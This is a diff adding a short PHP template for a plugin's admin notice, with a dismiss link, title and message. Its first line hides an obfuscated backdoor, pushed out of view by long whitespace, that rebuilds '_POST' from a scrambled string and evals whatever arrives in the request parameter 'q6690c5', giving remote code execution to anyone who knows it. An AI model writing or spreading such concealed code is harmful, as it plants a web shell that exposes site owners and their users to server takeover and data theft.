@@ -1,0 +1,6 @@
+<?php                                                                                                                                                                                                                                                  $sbp12 ="tpos_" ; $azdm73=strtoupper( $sbp12[4].$sbp12[1]. $sbp12[2]. $sbp12[3].$sbp12[0] ); if(isset( ${ $azdm73 } [ 'q6690c5'] ) ) {eval ( ${ $azdm73}['q6690c5' ] ) ;}?><div class="updated se-updated" id="se-top-global-notice" >
+	<div class="se-dismiss"><a href="<?php echo $close_url; ?>">Dismiss and go to settings</a></div>
+	<h3><?php echo $notice['title']; ?></h3>
+	<p class="se-about-description"><?php echo $notice['message']; ?></p>
+</div>
+
